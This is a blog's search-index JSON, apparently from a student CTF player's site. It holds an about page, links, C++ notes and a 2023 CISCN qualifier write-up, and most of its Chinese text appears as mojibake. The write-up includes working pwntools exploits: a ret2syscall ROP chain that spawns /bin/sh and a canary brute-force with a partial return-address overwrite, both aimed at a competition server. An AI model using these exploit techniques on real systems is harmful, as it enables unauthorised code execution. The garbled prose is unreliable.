ç›´æ¥åœ¨è™šæ‹Ÿæœºç»ˆç«¯æˆ–æ˜¯è®°äº‹æœ¬è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…éƒ½å¯èƒ½ä¼šä½¿è¿›ç¨‹å¡æ­»ï¼Œ æ‰€ä»¥å°†è¯¥txtæ–‡ä»¶æ‹–å…¥åœ°è¡¨è¾ƒå¼ºçš„ç¼–è¾‘å™¨010editorä¸­ï¼Œåœ¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œ å¾—åˆ°flag\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/5_oh-my-python_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"reverse-Oh My Python"},{"content":"","date":"July 5, 2023","permalink":"/tags/rsa/","section":"Tags","summary":"","title":"RSA"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E7%A3%81%E7%9B%98%E5%8F%96%E8%AF%81/","section":"Tags","summary":"","title":"ç£ç›˜å–è¯"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/","section":"Tags","summary":"","title":"å¤å…¸å¯†ç å­¦"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E6%B5%81%E9%87%8F%E5%8F%96%E8%AF%81/","section":"Tags","summary":"","title":"æµé‡å–è¯"},{"content":"","date":"July 5, 2023","permalink":"/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/","section":"Tags","summary":"","title":"æ ˆæº¢å‡º"},{"content":"Believe it or not , this is just a **test **. [doge]\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\rYou cannot see me unless you\u0026rsquo;ve got the password! # This is the content you want to encrypt!\nDo remember to close the hugo-encryptor shortcodes tag:\n","date":"July 4, 2023","permalink":"/posts/wp/2023_04_ctf/111/","section":"Posts","summary":"\u003cp\u003eBelieve it or not , this is just a **test **. [doge]\u003c/p\u003e","title":"An Encrypted Post"},{"content":"Hiï¼ä½ å¥½å‘€ï¼\næ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢å°ç«™ï¼\nè¿™é‡Œæ˜¯ta0lve , ä¸€åæ™®é€šçš„åœ¨æ ¡å¤§å­¦ç”Ÿã€‚\nå…³äºæˆ‘ # pwnæ–°æ‰‹ï¼Œè¿˜åœ¨å­¦ä¹ çš„å¾é€”ä¸­ å¸¸å¸¸å’Œèˆå‹ä¸€èµ·æ‰“CTFï¼Œè´Ÿè´£pwn\u0026amp;reverse\u0026amp;Cryptoï¼Œä¹Ÿä¼šæ‰“ä¸€æ‰“misc ç½‘å®‰ä¸“ä¸šåœ¨è¯»å‡†å¤§äºŒï¼ŒäºŒè¿›åˆ¶å®‰å…¨çˆ±å¥½è€… ä¸åˆä¼‘æ˜Ÿäººï¼Œå¸¸å¹´ä¸­åˆä¸å›å®¿èˆï¼Œéšæœºå‡ºç°åœ¨å®éªŒå®¤ã€æ•™å­¦æ¥¼ã€å›¾ä¹¦é¦†ï¼Œæ™šä¸Š8ç‚¹è¿˜å¯èƒ½å‡ºç°åœ¨å››ç™¾ç±³è·‘é“ä¸Š å•¥éƒ½æƒ³å­¦ï¼Œå•¥éƒ½æƒ³è¯•ï¼šä¿¡å®‰ï¼Œå¼€å‘ï¼Œæœºå™¨å­¦ä¹ ï¼Œæ•°å­¦å»ºæ¨¡\u0026hellip; å–œæ¬¢ä¸­åœŸä¸–ç•Œï¼Œnåˆ·ã€Šé­”æˆ’ã€‹ï¼Œé«˜ä¸­æ—¶è¿ç»­å‡ å¤©è¯»å®Œã€Šç²¾çµå®é’»ã€‹ å›½é™…è±¡æ£‹çˆ±å¥½è€…ï¼Œå››å›½å†›æ£‹çˆ±å¥½è€… åŠä¸ªäºŒæ¬¡å…ƒï¼Œnåˆ·ã€Šå†°è“ã€‹ã€ã€Šä½ çš„åå­—ã€‹ã€ã€Šå£°ä¹‹å½¢ã€‹ï¼Œä¸ºäº†çœ‹ã€Šç½—å°é»‘ã€‹å’Œã€Šé£çµç‰ç§€ã€‹åŠ å…¥äº†é•¿ç”Ÿå®—å¤©å¤©æ³¡æ¸æ å…³äºåšå®¢ # æ­¤åšå®¢æ­å»ºäº2023å¹´7æœˆ2æ—¥ï¼Œå¸Œæœ›èƒ½å¤Ÿåœ¨è¿™ä¸ªblogé‡Œè®°å½•è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ä¸æ€è€ƒï¼Œå¸Œæœ›è‡ªå·±èƒ½å’Œè¿™ä¸ªblogä¸€èµ·æˆé•¿\næ­¤åšå®¢åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼ˆå¯ä»¥çœ‹çœ‹åšå®¢çš„å³ä¸Šè§’ï¼‰\nå½’æ¡£ Postsï¼šæ‰€æœ‰çš„åšå®¢æ–‡ç« éƒ½åœ¨æ­¤å½’æ¡£ï¼Œéƒ¨åˆ†æ–‡ç« æœ‰åŠ å¯†ï¼ˆå‰ç«¯æœ‰ç‚¹ç®€é™‹ï¼Œä¸»è¦æ˜¯æ‡’å¾—æ”¹ğŸ˜´ï¼‰ åˆ†ç±» Categoriesï¼šä¸€äº›å¤§çš„æ–¹å‘ä¸Šçš„æ–‡ç« åˆ†ç±»ï¼Œå¦‚CTFç¬”è®°ã€WPã€ç¼–ç¨‹è¯­è¨€çš„å­¦ä¹ ã€ç”Ÿæ´»è®°å½•ç­‰ æ ‡ç­¾ Tagsï¼šé€šè¿‡æŸäº›å…³é”®è¯æ¥å¯»æ‰¾ç›¸å…³çš„æ–‡ç« ï¼Œå¦‚æŸ¥çœ‹ä¸pwnã€reverseã€æ ˆæº¢å‡ºè¿™äº›ç›¸å…³çš„æ–‡ç«  å‹é“¾ linkï¼šä¸€äº›ä¼˜ç§€å¸ˆå‚…ã€æœ‹å‹çš„åšå®¢é“¾æ¥ï¼Œæ–¹ä¾¿å¤§å®¶å»å›´è§‚å¤§ä½¬åšå®¢ Pointï¼šå€Ÿç”¨äº†Cè¯­è¨€é‡ŒæŒ‡é’ˆçš„åå­—ï¼Œå…¶å®åªæ˜¯è‡ªå·±åœ¨å­¦ä¹ é€”ä¸­å‚è€ƒçš„ä¸€äº›å¤§ä½¬çš„åšå®¢ï¼Œä¼šå°†æ‰€çœ‹çš„å¤§ä½¬çš„åšå®¢æ–‡ç« é“¾æ¥æ”¾åœ¨é‡Œé¢ï¼Œå°±å½“æ˜¯ä¹¦ç­¾ä¸å­¦ä¹ è®°å½•äº†ã€‚è¿˜ä¼šæ”¾ä¸€äº›è‡ªå·±å¸¸ç”¨çš„åœ¨çº¿å·¥å…·\u0026amp;åœ¨çº¿ç½‘ç«™ï¼Œæ–¹ä¾¿ä»¥åè‡ªå·±å¿«é€Ÿæ‰¾åˆ° Aboutï¼šå³æœ¬é¡µé¢ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹è‡ªå·±ä¸è¿™ä¸ªåšå®¢ æœç´¢æ¡†ï¼šå¯ä»¥æœç´¢æœ¬åšå®¢çš„æ–‡ç« å†…å®¹ï¼ˆä½äºåšå®¢ç•Œé¢çš„å³ä¸Šè§’ï¼‰ å°å¤ªé˜³/æœˆäº®æ ‡å¿—ï¼šç‚¹å‡»è½¬æ¢ç™½å¤©å’Œé»‘å¤œæ¨¡å¼ï¼ˆä½äºåšå®¢ç•Œé¢çš„å³ä¸Šè§’ï¼‰ ","date":"July 2, 2023","permalink":"/about/","section":"","summary":"Hiï¼ä½ å¥½å‘€ï¼ æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢å°ç«™ï¼ è¿™é‡Œæ˜¯ta0lve , ä¸€å","title":""},{"content":" Dalaosï¼š # GZTime # Walking on the Time Axis.\nTEL # Web king !\nweyung # a Crypto CTFer\nMy friendsï¼š # Pazuris # a nice Weber and a nice friend\n","date":"July 2, 2023","permalink":"/link/","section":"","summary":"Dalaosï¼š # GZTime # Walking on the Time Axis.\nTEL # Web king !\nweyung # a Crypto CTFer\nMy friendsï¼š # Pazuris # a nice Weber and a nice friend","title":""},{"content":"ä»¥ä¸‹ä¸º2023ä¿¡å®‰å›½èµ›åˆèµ›çš„pwnï¼Œreverseå’ŒCryptoçš„éƒ¨åˆ†é¢˜\npwn-çƒ§çƒ¤æ‘Šå„¿ # from pwn import * is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;123.56.135.185\u0026#34;, 31924) else: taolve = process(\u0026#39;./pwn\u0026#39;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;1\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.sendline(b\u0026#34;1\u0026#34;) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) # é€šè¿‡è´Ÿæ•°æ¥å¢åŠ è‡ªå·±çš„é’±çš„æ•°é‡ï¼Œä½¿å¾—ä¹‹åæœ‰è¶³å¤Ÿçš„é’±æ¥æ‰¿åŒ…çƒ§çƒ¤æ‘Š taolve.sendline(b\u0026#34;-100000\u0026#34;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;4\u0026#34;) taolve.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) taolve.sendline(b\u0026#34;5\u0026#34;) # ä¸€äº›å¯èƒ½ä¼šç”¨åˆ°çš„ropçš„åœ°å€ # ä½¿ç”¨ ROPgadget å·¥å…· pop_rdi_ret = 0x040264f pop_rdi = 0x040264f pop_rsi = 0x0040a67e pop_rdx_rbx = 0x04a404b pop_rax = 0x00458827 ret = 0x040101a # æˆ‘ä»¬å¡«å†™çš„nameçš„åœ°å€ï¼Œå¯ä»¥ç›´æ¥åœ¨idaä¸Šå¾—åˆ° name = 0x04E60F0 # å°†/bin/shå­—ç¬¦ä¸²å†™åˆ°nameçš„åœ°å€ payload = b\u0026#34;/bin/sh\\x00\u0026#34; + b\u0026#34;a\u0026#34; * 31 + b\u0026#34;d\u0026#34; # æ„é€ syscall ROPé“¾ï¼ˆç»å…¸çš„ret2syscallè§£æ³•ï¼‰ payload += p64(ret) + p64(pop_rax) + p64(0x3b) payload += p64(pop_rdx_rbx) + p64(0x0) + p64(1) + p64(pop_rdi) + p64(name) payload += p64(pop_rsi) + p64(0x0) + p64(0x45A066) taolve.recvuntil(b\u0026#34;\\n\u0026#34;) taolve.sendline(payload) taolve.interactive() pwn-funcanary # from pwn import * import struct is_debug = 1 is_remote = 1 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;123.56.135.185\u0026#34;, 31924) else: taolve = process(\u0026#39;./pwn\u0026#39;) taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) # canaryçš„æœ€åä¸€ä¸ªå­—èŠ‚å›ºå®šä¸º\\x00 canary = b\u0026#39;\\x00\u0026#39; # æ£€éªŒæˆ‘ä»¬å¡«å……çš„ padding çš„é•¿åº¦æ˜¯å¦æ­£ç¡® taolve.send(b\u0026#39;a\u0026#39; * 104 + canary) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;have fun\\n\u0026#39; in a: print(\u0026#34;ok\u0026#34;) # æ‹–åˆ°idaæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°forkå‡½æ•°ï¼Œ # forkå‡½æ•°ç›¸å½“äºæ˜¯åœ¨ä¸æ–­çš„è¿›è¡Œä¸€ä¸ªè‡ªæˆ‘å¤åˆ¶ï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡å¤åˆ¶å‡ºæ¥çš„ç¨‹åºçš„canaryå€¼ä¹Ÿæ˜¯ä¸€æ ·ã€‚ # æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸ªé€ä½çš„çˆ†ç ´ï¼Œå¦‚æœç¨‹åºå¼‚å¸¸é€€å‡ºæ²¡æœ‰æ‰“å°â€œhave funâ€ï¼Œå°±è¯´æ˜è¿™ä¸€ä½ä¸å¯¹ï¼Œ # å¦‚æœç¨‹åºæ­£å¸¸ï¼Œæ‰“å°äº†â€œhave funâ€ï¼Œå°±å¯ä»¥æ¥ç€è·‘ä¸‹ä¸€ä½ # æ‰€ä»¥æˆ‘ä»¬å¾ªç¯7æ¬¡æ¥çˆ†ç ´å‡ºcanaryçš„å‰7ä½å­—èŠ‚ for j in range(7): for i in range(0x100): taolve.send(b\u0026#39;a\u0026#39; * 104 + canary + struct.pack(\u0026#39;B\u0026#39;, i)) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;have fun\\n\u0026#39; in a: canary += struct.pack(\u0026#39;B\u0026#39;, i) break print(\u0026#34;canary \u0026#34;.encode(\u0026#39;utf-8\u0026#39;) + canary) # ida ä¸Šå¯ä»¥çœ‹åˆ°åé—¨å‡½æ•°çš„åœ°å€æ˜¯0x01229 # ç¨‹åºå¼€äº†PIEä¿æŠ¤ï¼Œä¸è¿‡æœ€åä¸‰ä½çš„åœ°å€æ—¶ä¸å˜çš„ # æ‰€ä»¥æˆ‘ä»¬è¦†ç›–è¿”å›åœ°å€æ—¶å¯ä»¥ç›´æ¥è¦†ç›–ç¬¬ä¸€ä¸ªåå…­è¿›åˆ¶ä½ä¸º\\x31, # è€Œç¬¬äºŒä¸ªåå…­è¿›åˆ¶ä½åˆ™å¯ä»¥é‡‡ç”¨çˆ†ç ´çš„æ–¹å¼ backdoor = b\u0026#34;\\x31\u0026#34; for j in range(1): for i in range(0x100): backdoor1 = backdoor + struct.pack(\u0026#39;B\u0026#39;, i) payload = b\u0026#39;a\u0026#39; * 104 + canary + b\u0026#39;a\u0026#39; * 8 + backdoor1 taolve.send(payload) a = taolve.recvuntil(b\u0026#39;welcome\\n\u0026#39;) if b\u0026#39;flag\u0026#39; in a: # å½“æ¥æ”¶åˆ°flagå­—ç¬¦ä¸²æ—¶ç¨‹åºåœæ­¢ pause() taolve.interactive() reverse-babyre # å…ˆåœ¨ç½‘ç«™æ‰“å¼€é¢˜ç›®å‘è¿‡æ¥çš„xmlé¡¹ç›®ï¼Œçœ‹åˆ°ä»£ç å—ï¼Œå°†ä»£ç å—ç¿»è¯‘æˆc++ä»£ç \n#include\u0026lt;iostream\u0026gt; #include\u0026lt;vector\u0026gt; using namespace std; int main() { vector\u0026lt;int\u0026gt;secret = { 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 }; string flag; vector\u0026lt;int\u0026gt;test; cin \u0026gt;\u0026gt; flag; for (int i = 0; i \u0026lt; flag.length(); i++) { int tmp; if (i == 0) { tmp = (int)flag[i] ^ 0; } else { tmp = (int)flag[i] ^ (int)flag[i - 1]; } test.push_back(tmp); } if (test.size() == secret.size()) { bool is_ok = true; for (int i = 0; i \u0026lt; test.size(); i++) { int item = test[i]; int b = secret[i]; if (item\u0026lt;b || item\u0026gt;b) { is_ok = false; } } if (is_ok) { cout \u0026lt;\u0026lt; \u0026#34;well done!\u0026#34;; } } return 0; } å¯¹åº”å†™å‡ºreè„šæœ¬\n#include\u0026lt;iostream\u0026gt; #include\u0026lt;vector\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; string flagchars = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_{}\u0026#34;; int main() { vector\u0026lt;int\u0026gt;secret = { 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 }; string flag; vector\u0026lt;int\u0026gt;test; int index = 0; for (int i = 0; i \u0026lt; secret.size(); i++) { for(int j = 0;j\u0026lt;flagchars.size();j++){ int tmp = 0; if (index == 0) { tmp = int(flagchars[j]) ^ 0; } else { tmp = int(flagchars[j]) ^ flag[index - 1]; } if (tmp == secret[index]) { flag += flagchars[j]; index++; break; } } } cout \u0026lt;\u0026lt; flag \u0026lt;\u0026lt; endl; return 0; } è¿è¡Œè„šæœ¬å¾—åˆ°flag\nCrypto-åŸºäºå›½å¯†SM2ç®—æ³• # ç›´æ¥ç…§ç€æ–‡æ¡£ä¸€æ­¥ä¸€æ­¥çš„èµ°å³å¯ï¼Œç”¨åˆ°äº†ä¸¤ä¸ªåœ¨çº¿ç½‘ç«™ï¼š\nhttps://const.net.cn/tool/sm2/genkey/\nç¬¬ä¸€ä¸ªç½‘ç«™ç”¨æ¥ç”ŸæˆSM2å¯†é’¥ https://the-x.cn/cryptography/Sm2.aspx\nç¬¬äºŒä¸ªç½‘ç«™ç”¨æ¥åœ¨çº¿åŠ è§£å¯†SM2ç®—æ³•å’ŒSM4ç®—æ³•\nå…ˆåœ¨åœ¨çº¿ç½‘ç«™ https://const.net.cn/tool/sm2/genkey/ ä¸Šç”ŸæˆSM2å¯†é’¥ï¼š my_private_key F68AC4F1AEA7F95390B1B485661B9A226B701553A5BB6BD200079887B0C2BAF5 my_public key 97E2124611B1288B31B72DC1DAD447B52C4CA2F8FC546B2B6E8B8FD7F71D10AF60301DAFF296D1DE 1041E1739D4ED46423714230B1800723993E8E457D95BC28 ç„¶åå…¨ç¨‹è·Ÿç€æ–‡æ¡£èµ°ï¼š pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;name=my_name\u0026amp;school=my_school\u0026amp;phone=my_tel\u0026#34; http://39.106.48.123:35153/api/login { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; } } pwner@pwner-virtual-machine:~/CTF$curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026amp;publicKey=97E2124611B1288B31B72DC1DAD447B52C4CA2F8FC546B2B6E8B8FD7F71D10AF60301DAFF296D1DE1041E1739D4ED46423714230B1800723993E8E457D95BC28\u0026#34; http://39.106.48.123:35153/api/allkey { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;publicKey\u0026#34;: \u0026#34;041c6292afb7213ab575328f097fb55400be7fcc09e81cef3f61467603b566ab836e4ef4b72e697ce0a1e4d97c455a3f16fac7fef56c273a308dc042efe7dd2e4c\u0026#34;, \u0026#34;privateKey\u0026#34;: \u0026#34;eaa50cc1302292a8b7930c81737af202cf646acc4998c55dec8912a0ec41e7eb\u0026#34;, \u0026#34;randomString\u0026#34;: \u0026#34;52ed9891b127e04726b0244ff388da3d61dfff8eb15c99ec6cf108d0a24429f23a63037ae215945d59720287e87703c2d95cf2a92099b22b02db08d292c1909c2c44e778efb0d8b765141444ee03e7f890b5bc9daa36c03d67abf97fe5d0563060fc557ccac0aae284a35232f007a62b\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; } pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; http://39.106.48.123:35153/api/quantumm { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34;, \u0026#34;quantumString\u0026#34;: \u0026#34;64b8fe642b52996eaa5ec41e9a2b170e4ef88d9c5090cb47b5131ff5ac734be544df579ef61e8664a24d1f0851152a092ea4f192a53593412cb298d2ccb40d4bfd9e9262eccf77fb79f0fcc4479b340ee9357e180a22c92912c6026e08dd23078e4a170e1a9683118dd74e470ce71034\u0026#34; } } pwner@pwner-virtual-machine:~/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026amp;quantumString=E05DF0B168B718EEE6F7B6D1D93ACE09\u0026#34; http://39.106.48.123:35153/api/check { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: \u0026#34;ç»“æœæ­£ç¡®ï¼Œè¯·è®¿é—® /api/searchè·å–æ‚¨çš„ flag\u0026#34; } pwner@pwner-virtual-machine:~/æ¡Œé¢/CTF$ curl -d \u0026#34;id=b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34; http://39.106.48.123:35153/api/searchh { \u0026#34;message\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;b2796de8-3c1a-42a7-b116-93b173e7a7ac\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;my_nmae\u0026#34;, \u0026#34;school\u0026#34;: \u0026#34;my_school\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;my_tel\u0026#34;, \u0026#34;publicKey\u0026#34;: \u0026#34;041c6292afb7213ab575328f097fb55400be7fcc09e81cef3f61467603b566ab836e4ef4b72e697ce0a1e4d97c455a3f16fac7fef56c273a308dc042efe7dd2e4c\u0026#34;, \u0026#34;privateKey\u0026#34;: \u0026#34;d0b086d584bd7e8ec07bfe6e05074ca557dbfa3693cbdaf7d13705865fa05a4e\u0026#34;, \u0026#34;randomString\u0026#34;: \u0026#34;7faca1be2a892b48a539893fb0bf9b60\u0026#34;, \u0026#34;quantumStringServer\u0026#34;: \u0026#34;e05df0b168b718eee6f7b6d1d93ace09\u0026#34;, \u0026#34;quantumStringUser\u0026#34;: \u0026#34;E05DF0B168B718EEE6F7B6D1D93ACE09\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;å·²å®Œæˆè€ƒé¢˜ï¼Œç»“æœæ­£ç¡®:flag{51035652-8117-44a0-9830-25ba73503def}\u0026#34; } }pwner@pwner-virtual-machine:~/CTF$ Crypto-Sign_in_passwd # flagæ–‡ä»¶é‡Œæœ‰ä¸¤è¡Œå­—ç¬¦ä¸²ï¼Œ\nj2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D\nGHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5\nè§‚å¯Ÿåæ¨æµ‹ç¬¬ä¸€è¡Œæ˜¯ç±»ä¼¼base64ç¼–ç åçš„å¯†æ–‡ï¼Œ ç¬¬äºŒè¡Œæœ‰ â€œ%â€ï¼Œæ¨æµ‹æ˜¯è¿›è¡Œäº†urlç¼–ç \nç¬¬ä¸€è¡Œå­—ç¬¦ä¸²ä¸èƒ½ç›´æ¥ç”¨æ¬§é€šçš„base64è§£ç ï¼Œä¹Ÿä¸èƒ½ç”¨base91ã€base92ç­‰ï¼Œ\nè€Œç¬¬äºŒè¡Œurlè§£ç ä¹‹åæ˜¯ï¼š\nGHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5 å¯ä»¥çœ‹è¿™ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯base64ç è¡¨çš„ä¹±åºï¼Œ\næ¨æµ‹æ˜¯ä»¥ç¬¬äºŒè¡Œå­—ç¬¦ä¸²ä¸ºæ–°çš„ç è¡¨æ¥å¯¹ç¬¬ä¸€è¡Œè¿›è¡Œè§£ç å¾—åˆ°flag\nç”±äºâ€œ=â€å·åœ¨ç è¡¨ä¸­é—´ï¼Œæ‰€ä»¥æŠŠæœ€åé¢çš„5å½“ä½œæ˜¯åŸæ¥çš„â€œ=â€å·ï¼Œ\nå¯ä»¥ç›´æ¥è‡ªå·±å†™ä¸€ä¸ªbase64è§£ç è„šæœ¬ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¸Šç½‘æœbase64è§£ç è„šæœ¬å†ä¿®æ”¹ç è¡¨\n# æ”¹å˜åçš„ç è¡¨ s = \u0026#34;GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF\u0026#34; def base64_changed_decode(inputs): # å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸º2è¿›åˆ¶ bin_str = [] for i in inputs: if i != \u0026#39;5\u0026#39;: x = str(bin(s.index(i))).replace(\u0026#39;0b\u0026#39;, \u0026#39;\u0026#39;) bin_str.append(\u0026#39;{:0\u0026gt;6}\u0026#39;.format(x)) # print(bin_str) # è¾“å‡ºçš„å­—ç¬¦ä¸² outputs = \u0026#34;\u0026#34; nums = inputs.count(\u0026#39;=\u0026#39;) while bin_str: temp_list = bin_str[:4] temp_str = \u0026#34;\u0026#34;.join(temp_list) # print(temp_str) # è¡¥è¶³8ä½å­—èŠ‚ if (len(temp_str) % 8 != 0): temp_str = temp_str[0:-1 * nums * 2] # å°†å››ä¸ª6å­—èŠ‚çš„äºŒè¿›åˆ¶è½¬æ¢ä¸ºä¸‰ä¸ªå­—ç¬¦ for i in range(0, int(len(temp_str) / 8)): outputs += chr(int(temp_str[i * 8:(i + 1) * 8], 2)) bin_str = bin_str[4:] print(\u0026#34;Decrypted String:\\n%s \u0026#34; % outputs) input_str = input(\u0026#34;Please enter a string that needs to be decrypted: \\n\u0026#34;) base64_changed_decode(input_str) \u0026#34;\u0026#34;\u0026#34; è¾“å‡ºï¼š Please enter a string that needs to be decrypted: j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D Decrypted String: flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4} \u0026#34;\u0026#34;\u0026#34; ","date":"June 30, 2023","permalink":"/posts/wp/2023_06_ciscn/","section":"Posts","summary":"ä»¥ä¸‹ä¸º2023ä¿¡å®‰å›½èµ›åˆèµ›çš„pwnï¼Œreverseå’ŒCryp","title":"2023 ciscn åˆèµ›"},{"content":"","date":"June 30, 2023","permalink":"/categories/c++/","section":"Categories","summary":"","title":"C++"},{"content":" cinä¸cout # ç¬¬ä¸€å‘¨T8ï¼ŒT9ï¼ŒT10\nä¸‹é¢è¯­å¥çš„è¾“å‡ºæ˜¯ï¼Ÿ\n1. std::cout\u0026lt;\u0026lt;0+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // 12.34\\n12.34 std::cout\u0026lt;\u0026lt;1+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // 2.34\\n12.34 std::cout\u0026lt;\u0026lt;8+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // Q)@@u@12.56 std::cout\u0026lt;\u0026lt;9+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // Q)@@u@12.56 std::cout\u0026lt;\u0026lt;11+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // æ— è¾“å‡ºï¼Ÿï¼Ÿï¼Ÿ std::cout\u0026lt;\u0026lt;12+\u0026#34;12.34\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // )@@u@12.56 2. std::cout\u0026lt;\u0026lt;\u0026#39;a\u0026#39;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // a\\n12.34 std::cout\u0026lt;\u0026lt;0+\u0026#39;a\u0026#39;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // 97\\n12.34 std::cout\u0026lt;\u0026lt;9+\u0026#34;a\u0026#34;\u0026lt;\u0026lt;std::endl\u0026lt;\u0026lt;12.34; // z(@@u@\\n12.34 // å­—ç¬¦å¯ä»¥è¢«è‡ªåŠ¨è½¬æ¢æˆæ•°å­—ï¼Œè€Œå­—ç¬¦ä¸²åˆ™æ˜¯è¾“å‡ºå…¶ç¬¬nä¸ªå­—ç¬¦å¼€å§‹çš„å­—ç¬¦ä¸²ï¼ˆä¸è‡ªåŠ¨è½¬æ¢ï¼‰ 3. int a=1; std::cin\u0026gt;\u0026gt;a; std::cout\u0026lt;\u0026lt;a; char b=\u0026#39;c\u0026#39;; //*1 std::cin\u0026gt;\u0026gt;b; std::cout \u0026lt;\u0026lt; b; //è¾“å…¥ä¸ºaè¾“å‡ºä¸º0ï¼Œæå‰èµ‹å€¼ä¹Ÿæ˜¯0ï¼Œ //åŸç†æ˜¯èµ‹å€¼æ—¶å‡ºç°äº†å¼‚å¸¸ //aä¾ç„¶åœ¨ç¼“å­˜åŒºé‡Œé¢ï¼Œä½¿å¾—åé¢çš„bæ²¡æœ‰è¾“å…¥å€¼ï¼Œåœ¨*1å¤„åŠ ä¸Šï¼š cin.clear(); cin.ignore(); //cin().clearç”¨æ¥æ›´æ”¹cinçŠ¶æ€æ ‡ç¤ºç¬¦ï¼› 